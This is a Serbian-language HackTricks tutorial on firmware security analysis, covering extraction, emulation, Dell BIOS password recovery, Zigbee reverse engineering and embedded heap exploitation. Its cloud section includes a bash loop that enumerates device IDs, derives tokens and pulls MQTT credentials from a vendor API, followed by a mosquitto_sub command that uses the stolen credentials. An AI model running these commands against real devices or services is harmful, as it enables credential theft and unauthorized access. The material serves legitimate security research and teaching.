# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključni softver koji omogućava uređajima da ispravno rade tako što upravlja komunikacijom između hardverskih komponenti i softvera s kojim korisnici rade i omogućava je. Čuva se u trajnoj memoriji, pa uređaj može da pristupi važnim instrukcijama čim se uključi, što dovodi do pokretanja operativnog sistema. Ispitivanje firmvera i njegovo potencijalno menjanje ključni su koraci u identifikovanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** je ključni početni korak u razumevanju sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Hardverskom rasporedu i tehničkoj dokumentaciji
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i vrstama licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i utvrđenim ranjivostima

U tu svrhu, alati za **open-source intelligence (OSINT)** su neprocenjivi, kao i analiza svih dostupnih komponenti open-source softvera, korišćenjem manuelnih i automatizovanih procesa pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja se može iskoristiti za pronalaženje potencijalnih problema.

## **Nabavljanje firmvera**

Firmver se može pribaviti na različite načine, od kojih svaki ima svoj nivo složenosti:

- **Direktno** od izvora (programera, proizvođača)
- **Izgradnjom** na osnovu dostavljenih uputstava
- **Preuzimanjem** sa zvaničnih stranica za podršku
- Korišćenjem upita **Google dork** za pronalaženje firmvera dostupnog na internetu
- Direktnim pristupom **cloud storage-u**, uz alate kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Ekstrakcijom** sa uređaja preko veza kao što su **UART**, **JTAG** ili **PICit**
- **Hvatanjem** zahteva za ažuriranje u komunikaciji uređaja
- Pronalaženjem i korišćenjem **hardkodiranih endpoint-a za ažuriranje**
- **Dump-ovanjem** iz bootloader-a ili mreže
- **Uklanjanjem i čitanjem** memorijskog čipa, kada ništa drugo ne uspe, pomoću odgovarajućih hardverskih alata

### Logovi dostupni samo preko UART-a: forsiranje root shell-a pomoću U-Boot env-a u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete da forsirate init shell tako što ćete offline **izmeniti U-Boot environment blob**:<sup>[[6]](#references)</sup>

1. Dump-ujte SPI flash pomoću SOIC-8 klipse i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo flešujte samo env particiju i restartujte uređaj; shell bi trebalo da se pojavi na UART-u.

Ovo je korisno na ugrađenim uređajima kod kojih je shell bootloader-a onemogućen, ali je env particija upisiva putem pristupa spoljnoj flash memoriji.

## Analiza firmware-a

Sada kada **imate firmware**, potrebno je da iz njega izdvojite informacije da biste znali kako da ga obradite. Evo nekoliko alata koje možete koristiti:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađete mnogo toga, proverite **entropiju** slike pomoću `binwalk -E <bin>`; ako je entropija niska, slika verovatno nije šifrovana. Ako je entropija visoka, verovatno je šifrovana (ili kompresovana na neki način).

Pored toga, pomoću ovih alata možete izdvojiti **datoteke ugrađene u firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili upotrebite [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da biste pregledali datoteku.

### Diferencijalna analiza flash memorije i oporavljiva skladišta XOR tajni

Kada format skladištenja neke postavke firmware-a nije dokumentovan, prvo napravite nekoliko očitavanja iste flash memorije, promenite **tačno jednu** postavku, ponovo napravite dump celog čipa i uporedite pomeraje. Ponavljanje eksperimenta sa kontrolisanim vrednostima pomaže da razlikujete postavku od brojača i metapodataka upisa; promene na novim pomerajima, umesto na postojećim, ukazuju na append-only ili log-structured skladište. Sačuvajte obrisane ili označene kao obrisane stavke jer se njihovi bajtovi podataka možda i dalje mogu oporaviti.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nakon lociranja regiona, izdvojite module firmvera alatima kao što je `binwalk` i obrnuto analizirajte writer/validator u Ghidra-i. Potvrdite granice polja, padding, indeksiranje ključa i izvođenje ključa u kodu, umesto da šemu zaključujete samo na osnovu obrazaca šifratnog teksta.<sup>[[10]](#references)</sup>

#### Oporavak ključeva iz šifrovanog popunjavanja nulama

Kao što je opisano u [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), poznati otvoreni tekst otkriva bajtove keystream-a na istim pomerajima. Polje fiksne veličine posebno je izloženo kada se njegovo popunjavanje nulama proteže preko svih indeksa ponavljajućeg XOR ključa: šifrovano popunjavanje direktno otkriva te bajtove ključa, jer je `0x00 XOR key_byte = key_byte`. Ako su obuhvaćeni svi indeksi ključa, rekonstrušite ključ iz završnog dela šifrata i dešifrujte popunjene bajtove.<sup>[[10]](#references)</sup>

Dell-ov ranjivi format DVAR BIOS lozinke konkretan je primer: bajt `0` polja od 32 bajta je u otvorenom tekstu, dok se za bajtove `1..31` koristi ponavljajući ključ od 20 bajtova.<sup>[[10]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Za dužinu lozinke `L`, pozicije `L..31` bile su nule pre XOR operacije. Kada je `L <= 12`, te pozicije obuhvataju svaki indeks ključa, pa se ceo ključ i lozinka mogu rekonstruisati bez brute force-a:<sup>[[10]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Izvucite ključeve iz istorijskih zapisa

Nemojte analizirati svaki zapis zasebno. DVAR ključ se približno izvodi kao `modified_md5(device_seed || variable_GUID || password[0])`: seed uređaja i GUID su fiksni, a jedini ulaz koji zavisi od lozinke jeste njen prvi bajt u otvorenom tekstu. To daje najviše 256 ključeva po uređaju, pa zapisi koji počinju istim bajtom dele isti ključ. Grupisanje aktivnih i obrisanih zapisa prema tom bajtu pokazuje kako kratak istorijski zapis može da otkrije ceo ključ kroz padding i dešifruje trenutni, duži zapis čiji padding sam po sebi nije dovoljan. Rotacija lozinke zato može povećati izloženost kada se stari šifrat označi kao obrisan umesto da se izbriše.<sup>[[10]](#references)</sup>

Alat [`dellpwn`](https://github.com/R3n5k1/dellpwn) pronalazi DVAR, proverava kandidate za zapise, oporavlja lozinke i može da prikaže sirove bajtove podataka i ključa. Izgradite ga iz checkout-a i skenirajte proverenu flash sliku na sledeći način:<sup>[[11]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Za prilagođene parsere odbacite lažno pozitivne rezultate proverom strukture zapisa, ograničenja za štampive znakove, dopune nulama, entropije ključa i doslednosti na mestu gde se ključ ponavlja. Ako ponovljeni dump-ovi pokažu retke promene bitova pri svakom upisu, navedite uočene maske i rangirajte korekcije prema ovim ograničenjima, ali prijavite dvosmislene znakove umesto da heuristički rezultat predstavljate kao tačno izdvajanje.<sup>[[10]](#references)</sup>

Proverivači lozinki treba da čuvaju salted, iterirani jednosmerni hash umesto reverzibilnog šifrata, a skladišta sa log-strukturom treba bezbedno da uklanjaju zastareli tajni materijal.<sup>[[10]](#references)</sup>

### Dobavljanje sistema datoteka

Uz prethodno pomenute alate, kao što je `binwalk -ev <bin>`, trebalo je da možete da **izdvojite sistem datoteka**.\
Binwalk ga obično izdvaja u **direktorijum nazvan po tipu sistema datoteka**, koji je obično jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje sistema datoteka

Ponekad binwalk **nema bajt-magic vrednost sistema datoteka u svojim potpisima**. U tim slučajevima, upotrebite binwalk da **pronađete pomeraj sistema datoteka i izdvojite komprimovani sistem datoteka** iz binarne datoteke, a zatim ga **ručno izdvojite** u skladu s njegovim tipom pomoću koraka u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** za izdvajanje Squashfs sistema datoteka.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u gornjem primeru)

`$ unsquashfs dir.squashfs`

Datoteke će se zatim nalaziti u direktorijumu "`squashfs-root`".

- CPIO arhivske datoteke

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 sisteme datoteka

`$ jefferson rootfsfile.jffs2`

- Za ubifs sisteme datoteka sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analiza firmware-a

Kada se firmware pribavi, važno je detaljno ga analizirati kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz firmware slike.

### Alati za početnu analizu

Dat je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i sistemu datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenilo stanje enkripcije slike, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na nedostatak enkripcije, dok visoka entropija ukazuje na moguću enkripciju ili kompresiju.

Za izdvajanje **ugrađenih datoteka** preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje datotečnog sistema

Pomoću `binwalk -ev <bin>` obično je moguće izdvojiti datotečni sistem, često u direktorijum čiji je naziv tip datotečnog sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip datotečnog sistema zbog nedostajućih magic bytes, potrebno je ručno izdvajanje. To podrazumeva korišćenje `binwalk` za pronalaženje pomeraja datotečnog sistema, a zatim komande `dd` za izdvajanje datotečnog sistema:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga, u zavisnosti od tipa filesystema (npr. squashfs, cpio, jffs2, ubifs), koriste se različite komande za ručno izdvajanje sadržaja.

### Analiza filesystema

Kada se filesystem izdvoji, počinje potraga za bezbednosnim propustima. Pažnja se obraća na nebezbedne mrežne daemon-e, hardkodirane akreditive, API endpoint-e, funkcionalnosti servera za ažuriranje, nekompajlirani kod, startup skripte i kompajlirane binarne fajlove za offline analizu.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za korisničke akreditive
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne fajlove zbog mogućih ranjivosti
- Ugrađene binarne fajlove za dalju analizu
- Uobičajene web servere i binarne fajlove IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti u filesystemu:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmware-a
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih fajlova

U filesystemu treba pažljivo ispitati ranjivosti i u izvornom kodu i u kompajliranim binarnim fajlovima. Alati poput **checksec.sh** za Unix binarne fajlove i **PESecurity** za Windows binarne fajlove pomažu u identifikovanju nezaštićenih binarnih fajlova koji bi mogli da budu iskorišćeni.

## Prikupljanje cloud konfiguracije i MQTT akreditiva putem izvedenih URL tokena

Mnogi IoT hub-ovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpoint-a koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmware-a možete otkriti da se `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodirane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen je kao heksadecimalni zapis velikim slovima

Ovakav dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, koja često otkriva MQTT akreditive u čistom tekstu i prefikse topic-a.

Praktični postupak:

1) Izdvojite deviceId iz UART boot log-ova

- Povežite 3.3V UART adapter (TX/RX/GND) i zabeležite log-ove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a konfiguracije u oblaku i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavite STATIC_KEY i algoritam tokena iz firmvera

- Učitajte binarne fajlove u Ghidra/radare2 i potražite putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr., MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i pretvorite digest u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT akreditive

- Sastavite URL i preuzmite JSON pomoću curl-a; analizirajte ga pomoću jq da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotreba MQTT-a u otvorenom tekstu i slabih ACL-ova za topic-e (ako postoje)

- Koristite pribavljene akreditive da biste se pretplatili na maintenance topic-e i potražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerišite predvidljive ID-jeve uređaja (u velikom obimu, uz ovlašćenje)

- Mnogi ekosistemi ugrađuju OUI/produktne/tipske bajtove dobavljača, iza kojih sledi sekvencijalni sufiks.
- Možete programski prolaziti kroz moguće ID-jeve, izvoditi tokene i preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Beleške
- Uvek pribavite izričito ovlašćenje pre pokušaja masovnog nabrajanja.
- Kad god je moguće, dajte prednost emulaciji ili statičkoj analizi radi pribavljanja tajni bez menjanja ciljnog hardvera.


Proces emulacije firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prenos root sistema datoteka ili određenih binarnih datoteka na uređaj sa istom arhitekturom i redosledom bajtova, kao što je Raspberry Pi, ili na unapred pripremljenu virtuelnu mašinu, može olakšati dalje testiranje.

### Emulacija pojedinačnih binarnih datoteka

Pri ispitivanju pojedinačnih programa, ključno je utvrditi redosled bajtova i CPU arhitekturu programa.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu može se upotrebiti komanda:

```bash
file ./squashfs-root/bin/busybox
```

A za instaliranje neophodnih alata za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke little-endian koristi se `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, a za emulaciju se koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmware-a, automatizujući postupak i pomažući u dinamičkoj analizi.

### Rekonstrukcija podeljenih i verifikovanih root sistema datoteka za emulaciju

Ako je superblok SquashFS-a čitljiv, ali su pomeraji inode-a, direktorijuma ili fragment-tabele nemogući, nemojte odmah menjati `unsquashfs`. Obrnuto analizirajte binarnu datoteku ranog pokretanja i reprodukujte graf blok-uređaja koji ona kreira: ugrađeni sistemi mogu da izlože nominalnu root particiju, ali da stvarni sistem datoteka naprave pomoću mapiranja `dm-linear` koje dodaje sektore pozajmljene sa druge particije. Provere koje koriste samo superblok mogu proći iako su svi naredni blokovi metapodataka pomereni.<sup>[[9]](#references)</sup>

Sačuvajte aritmetiku firmware-a tačno. Posebno utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; reprodukujte pomeranja i skraćivanje istim redosledom kao u originalu; i uzmite u obzir oblasti na kraju particije koje zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` najpre skraćuje vrednost na granicu od 4 KiB, a tek zatim izražava rezultat u sektorima od 512 bajtova; zamena sa `partition_bytes // 512` može da pomeri dodati opseg za nekoliko kilobajta i ošteti sve naredne SquashFS tabele.<sup>[[9]](#references)</sup>

Koristan postupak provere je:<sup>[[9]](#references)</sup>

1. Iz binarne datoteke verifier/init utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Spojite ili mapirajte opsege bez menjanja njihove semantike poravnanja.
3. Ako ekstrakcija i dalje ne uspe, pretražite samo mali opseg oko predviđene granice i zahtevajte nekoliko uzastopnih validnih struktura metapodataka, umesto da prihvatite samo uverljiv superblok.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešan prolaz kroz sve direktorijume i fragmente predstavlja jači dokaz od rezultata `unsquashfs -stat`.

#### Zamena dm-verity koju kontroliše analitičar

Kada analitičar kontroliše QEMU kernel, initramfs i virtuelne diskove, izmenjeni root može da se pokrene zamenom proizvođačevog PID 1 za verifikaciju malim statički povezanim init-om. Ovo je **zamena lanca pokretanja u laboratorijskom okruženju**, a ne zaobilaženje dm-verity, njegovog RSA potpisa, Secure Boot-a ili ključa zapečaćenog u TPM-u.<sup>[[9]](#references)</sup>

Zamenski init treba da oponaša operativne delove originalnog puta pokretanja: montira `devtmpfs`, pozove `setsid()`, poveže `/dev/console` sa deskriptorima datoteka 0–2, montira `/proc` i `/sys`, sačeka dati blok-uređaj, montira izmenjeni root samo za čitanje, odvoji pseudo-sisteme datoteka starog root-a, premesti novo montiranje na `/`, pozove `chroot` i pokrene originalni firmware `/sbin/init` pomoću `execve()`. Odvajanje `/dev`, `/proc` i `/sys` **pre** `MS_MOVE` sprečava slučajno odvajanje tačaka montiranja koje pripadaju novom root-u.<sup>[[9]](#references)</sup>

Promenljivo stanje uređaja držite odvojeno od izmenjenog nepromenljivog root-a. qcow2 overlay može da sačuva LVM stanje originalnog diska, dok drugi virtuelni disk virtio, montiran samo za čitanje, obezbeđuje izmenjeni SquashFS:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Otklanjanje grešaka u stanju slike van mreže

Pregledajte trajno stanje izvan gostujućeg sistema kada sporo pokretanje, destruktivne skripte pri pokretanju ili nepouzdano evidentiranje konzole otežavaju otkrivanje uzroka kvara. Nikada ne priključujte overlay koji koristi pokrenuta VM; izložite ga pomoću `qemu-nbd`, ograničite LVM otkrivanje na predviđenu NBD particiju i deaktivirajte grupu volumena pre nego što je isključite.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Za ponovljivu izolaciju kvarova, upisujte vremenski označene marker datoteke na stabilan volumen u koji može da se piše i proveravajte ih van uređaja; `/dev/kmsg`, FIFO kanali i prolazne konzole mogu dovesti do lažno negativnih rezultata zbog ograničenja učestalosti ili ranog prekida procesa. Takođe, uporedite tačne interfejse između slojeva pre nego što menjate nepovezan kod: `uname -r` naspram `/lib/modules/`, funkcije ext4 na disku naspram konfiguracije kernela i generaciju Mesa `libGL` naspram DRI ABI-ja drajvera i naziva drajvera izvedenih iz PCI podataka. Komponenta može da postoji, pa čak i da se uspešno učita pomoću `dlopen()`, ali da i dalje bude neupotrebljiva zato što njen potrošač očekuje drugačiji ABI.<sup>[[9]](#references)</sup>

## Dinamička analiza u praksi

U ovoj fazi se za analizu koristi okruženje stvarnog ili emuliranog uređaja. Neophodno je održavati shell pristup OS-u i sistemu datoteka. Emulacija možda neće savršeno oponašati interakcije sa hardverom, pa će povremeno biti potrebno ponovo pokrenuti emulator. Analiza treba ponovo da obuhvati sistem datoteka, iskorišćavanje izloženih veb-stranica i mrežnih servisa i istraživanje ranjivosti bootloadera. Testovi integriteta firmware-a ključni su za prepoznavanje potencijalnih ranjivosti backdoor-a.

## Tehnike analize tokom izvršavanja

Analiza tokom izvršavanja podrazumeva interakciju sa procesom ili binarnom datotekom u njenom operativnom okruženju, uz korišćenje alata kao što su gdb-multiarch, Frida i Ghidra za postavljanje tačaka prekida i pronalaženje ranjivosti fuzzing-om i drugim tehnikama.

Za ugrađene ciljne sisteme bez potpunog debuggera, **kopirajte statički povezani `gdbserver`** na uređaj i povežite se sa njim udaljeno:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / mapiranje poruka radio-ko-procesora

Na IoT hubovima RF stack je često podeljen između **radio MCU-a** i Linux userland procesa. Koristan postupak je mapiranje putanje:<sup>[[8]](#references)</sup>

1. **RF frame** u vazduhu
2. **parser na strani kontrolera** na radio MCU-u
3. **tekstualni serijski/UART protokol ili TLV protokol** prosleđen Linux-u (na primer `/dev/tty*`)
4. **application dispatcher** u glavnom daemon-u
5. **handler specifičan za protokol / state machine**

Ova arhitektura daje dva cilja za reverse engineering umesto jednog. Ako kontroler pretvara binarne radio frame-ove u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, pronađite:

- **message groups** i dispatch tabele
- Koje poruke mogu doći sa **mreže**, a koje od samog kontrolera
- Tačna polja za razlikovanje specifična za proizvođača (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji handler-i su dostupni samo tokom faza **commissioning**, otkrivanja ili preuzimanja firmware-a/modela

Konkretno za Zigbee, snimite pairing saobraćaj i proverite da li se cilj još uvek oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako je tako, prisluškivanje commissioning saobraćaja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista zahteva.

### Handler-i za protokole specifične za proizvođača i dostupnost ograničena FSM-om

Zigbee/ZCL komande specifične za proizvođača često su bolja meta od standardizovanih cluster-a jer vode do **prilagođenog parsing koda** i internih **FSM-ova** sa slabije proverenom validacijom.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Obrnutim inženjeringom pratite command dispatcher dok ne pronađete **handler namenjen samo proizvođaču**.
- Pronađite tabele za **FSM state**, **event**, **check**, **action** i **next-state**.
- Identifikujte **prelazna stanja** koja se automatski nastavljaju, kao i retry/error grane koje na kraju resetuju ili oslobađaju memoriju koju kontroliše napadač.
- Potvrdite koje su legitimne razmene protokola potrebne da bi daemon dospeo u ranjivo stanje, umesto da pretpostavite da je ranjivi handler uvek dostupan.

Kod vremenski osetljivih protokola, replay paketa iz Python framework-a može biti prespor. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) uz vendor-grade stack, kako bi se izložili odgovarajući **endpoints**, **attributes** i timing za commissioning.

### Klasa grešaka u fragmented-download funkcionalnosti embedded daemon-a

Ponavljajuća klasa grešaka u firmware-u javlja se u preuzimanjima **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) čuva `ctx->total_size` i alocira `malloc(total_size)`.
2. Kasniji fragmenti proveravaju samo polja kontrolisana napadačem koja važe za konkretan paket, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere u odnosu na **prvobitnu veličinu alociranog bafera**.

Napadač može da pošalje:

- Prvi validan fragment sa **malom** deklarisanom ukupnom veličinom, kako bi izazvao malu heap alokaciju.
- Kasniji fragment sa **očekivanim offset-om**, ali većim `chunk_len`.
- Lažiranu veličinu za konkretan paket koja prolazi nove provere, ali i dalje prepisuje prvobitno alocirani bafer.

Kada se ranjiva putanja nalazi iza commissioning logike, eksploatacija mora da uključi dovoljno **device emulation** da bi se cilj doveo u očekivano stanje preuzimanja modela ili blob-a pre slanja neispravnih fragmenata.

### Protocol-driven okidači za `free()`

U embedded daemon-ima, najlakši način da se pokrene eksploatacija heap metapodataka često nije „čekanje na cleanup“, već **aktiviranje sopstvene obrade grešaka protokola**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naknadne fragmente kako biste FSM prebacili u **retry** ili **error** stanja.
- Pređite prag za retry kako bi daemon **resetovao context** i oslobodio oštećeni bafer.
- Iskoristite ovaj predvidljiv `free()` za pokretanje allocator-side primitiva pre nego što se proces sruši iz nepovezanih razloga.

Ovo je naročito korisno protiv **musl/uClibc/dlmalloc-like** allocator-a u embedded Linux-u, gde oštećivanje chunk metapodataka može da pretvori unlink/unbin logiku u write primitive. Stabilan obrazac je da se ošteti **size field** tako da se allocator traversal preusmeri u **fake chunks** smeštene unutar prepisanog bafera, umesto da se odmah pregaze pokazivači stvarnih bin-ova i sruši proces.

## Binary Exploitation i Proof-of-Concept

Izrada PoC-a za pronađene ranjivosti zahteva duboko razumevanje arhitekture cilja i programiranje u nižim programskim jezicima. Zaštite binary runtime-a su retke u embedded sistemima, ali kada postoje, mogu biti potrebne tehnike poput Return Oriented Programming (ROP).

### Beleške o uClibc fastbin eksploataciji (embedded Linux)

- **Fastbins + consolidation:** uClibc koristi fastbin-ove slične onima u glibc-u. Kasnija velika alokacija može da pokrene `__malloc_consolidate()`, pa svaki fake chunk mora da prođe provere (razumna veličina, `fd = 0` i okolni chunk-ovi koji se smatraju „in use“).<sup>[[6]](#references)</sup>
- **Non-PIE binarne datoteke pod ASLR-om:** ako je ASLR uključen, ali je glavni binary **non-PIE**, adrese unutar binary-ja u `.data/.bss` su stabilne. Možete ciljati oblast koja već liči na validno zaglavlje heap chunk-a, kako biste fastbin alokaciju usmerili na **tabelu function pointer-a**.
- **NUL koji zaustavlja parser:** prilikom parsiranja JSON-a, `\x00` u payload-u može zaustaviti parsiranje, a istovremeno sačuvati završne bajtove koje kontroliše napadač za stack pivot/ROP chain.
